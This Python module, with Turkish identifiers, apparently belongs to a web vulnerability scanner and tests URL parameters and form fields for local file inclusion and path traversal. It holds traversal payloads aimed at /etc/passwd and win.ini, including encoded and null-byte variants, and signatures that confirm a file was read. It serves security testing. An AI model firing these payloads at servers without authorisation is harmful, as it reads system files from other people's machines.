# -*- coding: utf-8 -*-
"""lfi (local file inclusion) / path traversal tarama modülü"""

import os
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from moduller.temel_modul import TemelModul
from yapilandirma import PAYLOAD_DIZINI, RISK_KRITIK, RISK_YUKSEK
from yardimci import bilgi, basari, uyari


class LfiModulu(TemelModul):
    """lfi / path traversal açıklarını tarayan modül"""

    @property
    def isim(self):
        return "LFI"

    @property
    def aciklama(self):
        return "local file inclusion ve path traversal tespiti"

    # bilinen dosya içerikleri — dosya okunabilirse bu kalıplar yanıtta bulunur
    DOSYA_KALIPLARI = {
        "/etc/passwd": [
            "root:x:0:0:",
            "root:*:0:0:",
            "daemon:x:",
            "bin:x:",
            "/bin/bash",
            "/bin/sh",
        ],
        "win.ini": [
            "[fonts]",
            "[extensions]",
            "[mci extensions]",
            "[files]",
        ],
        "boot.ini": [
            "[boot loader]",
            "[operating systems]",
            "multi(0)disk(0)",
        ],
    }

    def __init__(self, istek_yonetici):
        super().__init__(istek_yonetici)
        self.payloadlar = self._payloadlari_yukle()

    def _payloadlari_yukle(self):
        """payload dosyasından lfi payloadlarını yükler"""
        dosya_yolu = os.path.join(PAYLOAD_DIZINI, "lfi_payloadlar.txt")
        try:
            with open(dosya_yolu, "r", encoding="utf-8") as dosya:
                return [satir.strip() for satir in dosya if satir.strip() and not satir.startswith("#")]
        except FileNotFoundError:
            uyari("lfi payload dosyası bulunamadı, varsayılan payloadlar kullanılıyor")
            return self._varsayilan_payloadlar()

    def _varsayilan_payloadlar(self):
        """dosya bulunamazsa kullanılacak varsayılan payloadlar"""
        return [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "/etc/passwd%00",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]

    def tara(self, hedef_url, formlar=None, parametreli_urllar=None):
        """lfi taramasını çalıştırır"""
        bilgi(f"lfi taraması başlatılıyor: {hedef_url}")

        # parametreli url'leri tara
        if parametreli_urllar:
            for url in parametreli_urllar:
                self._url_parametrelerini_tara(url)

        # formları tara
        if formlar:
            for form in formlar:
                self._form_tara(form)

        bilgi(f"lfi taraması tamamlandı — {len(self.bulgular)} bulgu")
        return self.bulgular

    def _url_parametrelerini_tara(self, url):
        """url parametrelerini lfi için tarar"""
        parcalanmis = urlparse(url)
        parametreler = parse_qs(parcalanmis.query, keep_blank_values=True)

        # dosya dahil etme ile ilişkili parametre isimleri
        dosya_parametreleri = [
            "file", "page", "path", "include", "doc", "document",
            "folder", "root", "pg", "style", "template", "php_path",
            "dosya", "sayfa", "yol",
        ]

        for parametre_adi in parametreler:
            # öncelikli parametreleri belirle
            oncelikli = any(
                anahtar in parametre_adi.lower()
                for anahtar in dosya_parametreleri
            )

            # öncelikli olmayan parametreler için sınırlı payload
            test_payloadlari = self.payloadlar if oncelikli else self.payloadlar[:5]

            for payload in test_payloadlari:
                test_parametreleri = parametreler.copy()
                test_parametreleri[parametre_adi] = [payload]
                yeni_sorgu = urlencode(test_parametreleri, doseq=True)
                test_url = urlunparse((
                    parcalanmis.scheme, parcalanmis.netloc, parcalanmis.path,
                    parcalanmis.params, yeni_sorgu, parcalanmis.fragment,
                ))

                yanit = self.istek_yonetici.get(test_url)
                if yanit is None:
                    continue

                # dosya içeriği kontrolü
                bulunan_dosya = self._dosya_icerik_kontrol(yanit.text)
                if bulunan_dosya:
                    basari(f"lfi bulundu: {url} — parametre: {parametre_adi}")
                    self.bulgu_ekle(
                        url=url,
                        tip="Local File Inclusion",
                        risk=RISK_KRITIK,
                        aciklama=f"lfi açığı — parametre: {parametre_adi}",
                        detay=f"okunan dosya: {bulunan_dosya}",
                        payload=payload,
                        kanit=self._kanit_cikar(bulunan_dosya, yanit.text),
                    )
                    break

    def _form_tara(self, form):
        """form alanlarını lfi için tarar"""
        aksiyon = form["aksiyon"]
        metot = form["metot"]
        alanlar = form["alanlar"]

        for alan_adi, alan_bilgi in alanlar.items():
            if alan_bilgi["tip"] in ("hidden", "submit"):
                continue

            for payload in self.payloadlar[:8]:
                test_verisi = {}
                for ad, bilgi_dict in alanlar.items():
                    if ad == alan_adi:
                        test_verisi[ad] = payload
                    else:
                        test_verisi[ad] = bilgi_dict["deger"] or "test"

                if metot == "POST":
                    yanit = self.istek_yonetici.post(aksiyon, veri=test_verisi)
                else:
                    yanit = self.istek_yonetici.get(aksiyon, parametreler=test_verisi)

                if yanit is None:
                    continue

                bulunan_dosya = self._dosya_icerik_kontrol(yanit.text)
                if bulunan_dosya:
                    basari(f"lfi bulundu (form): {aksiyon} — alan: {alan_adi}")
                    self.bulgu_ekle(
                        url=aksiyon,
                        tip="Local File Inclusion (Form)",
                        risk=RISK_KRITIK,
                        aciklama=f"lfi açığı — form alanı: {alan_adi}",
                        detay=f"okunan dosya: {bulunan_dosya}, form: {aksiyon}",
                        payload=payload,
                        kanit=self._kanit_cikar(bulunan_dosya, yanit.text),
                    )
                    break

    def _dosya_icerik_kontrol(self, yanit_metni):
        """yanıt metninde bilinen dosya içeriklerini arar"""
        yanit_kucuk = yanit_metni.lower()
        for dosya_adi, kaliplar in self.DOSYA_KALIPLARI.items():
            for kalip in kaliplar:
                if kalip.lower() in yanit_kucuk:
                    return dosya_adi
        return None

    def _kanit_cikar(self, dosya_adi, yanit_metni, baglam=200):
        """dosya içeriğinin bulunduğu bağlamı çıkarır"""
        kaliplar = self.DOSYA_KALIPLARI.get(dosya_adi, [])
        for kalip in kaliplar:
            konum = yanit_metni.lower().find(kalip.lower())
            if konum != -1:
                baslangic = max(0, konum - 50)
                bitis = min(len(yanit_metni), konum + baglam)
                return f"...{yanit_metni[baslangic:bitis]}..."
        return ""
